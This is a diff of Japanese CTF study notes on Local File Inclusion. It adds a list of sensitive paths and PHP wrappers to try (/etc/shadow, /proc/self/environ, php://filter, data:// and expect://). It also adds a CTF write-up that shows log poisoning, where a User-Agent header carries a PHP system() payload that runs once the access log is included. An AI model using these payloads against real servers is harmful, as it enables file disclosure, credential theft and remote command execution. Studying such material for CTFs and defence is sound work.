@@ -24,7 +24,35 @@ https://security.stackexchange.com/questions/74538/alternative-ways-to-exploit-t
 ```
 nginx 0.6.36以前ではDirectory Traversalの脆弱性がある。  
 https://www.exploit-db.com/exploits/12804  
+  
+LFIできるときに試すやつリスト。  
+```txt
+/etc/passwd できないときもある。その時は以下で
+../etc/passwd ルートディレクトリまでの../の数を特定する
 
+/etc/shadow
+/etc/apache2
+/etc/apache2/apache2.conf 
+/etc/apache2/envvars: default environment variables for apache2ctlとか
+/etc/apache2/sites-enabled/000-default.conf: vhost configとか
+/etc/os-release: Debian GNU/Linux 9 (stretch)とか
+
+/proc/self/environ プロセスの環境変数を取得
+/proc/self/status: apache2とか
+/proc/self/mem 実際のメモリへのシンボリックリンク
+/proc/self/maps メモリマップを確認
+/proc/self/fd/2: logs, same as /var/log/apache2/error.logとか
+/proc/self/fd/7: logs, same as /var/log/apache2/access.logとか
+
+/var/www/html
+
+php://filter/convert.base64-encode/resource=index.php
+php://filter/resource=index.php
+php://input
+data://text/plain,<?php%20print_r(scandir(%27./%27));
+data:text/plain,base64,[base64] Base64を埋め込む
+expect://ls
+```
 # writeup
 ## bypass filter "." with "%E3%80%82" (hackerone)
 https://hackerone.com/reports/291750  
@@ -194,9 +222,33 @@ Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
 <long padding (guarantee to generate upload progress file)>
 ------WebKitFormBoundary2rwkUEtFdqhGMHqV--
 ```
+## Log Poisoning / "/proc/self/fd/7" (Byte Bandits CTF 2018 R3M3MB3R)
+https://rawsec.ml/en/ByteBanditsCTF-2018-write-ups/#200-r3m3mb3r-web  
+https://ctftime.org/writeup/9616  
+- **entrypoint**  
+`http://web.euristica.in/R3M3MB3R/index.php?f=eg.php`でLFIできるよっていうヒントが問題文にある。  
+`/R3M3MB3R/index.php?f=../../../../../../../var/log/apache2/access.log`  
+または  
+`/R3M3MB3R/index.php?f=/proc/self/fd/7`でLogファイルにアクセスできるので、  
+以下のようにUser-AgentにPHPを仕込んでLog Poisoningする。  
+```txt
+GET /R3M3MB3R/index.php?f=../../../../../../../var/log/apache2/access.log HTTP/1.1
+Host: web.euristica.in
+Upgrade-Insecure-Requests: 1
+User-Agent: <?php system('ls /var/www/html/');?>
+```
+- **payload**  
+`/R3M3MB3R/index.php?f=../../../../../../../var/log/apache2/access.log`  
+または  
+`/R3M3MB3R/index.php?f=/proc/self/fd/7`  
 ## 
 - **entrypoint**  
 - **payload**  
-
+## 
+- **entrypoint**  
+- **payload**  
+## 
+- **entrypoint**  
+- **payload**  
 # メモ
 https://www.hamayanhamayan.com/entry/2020/08/30/110845  
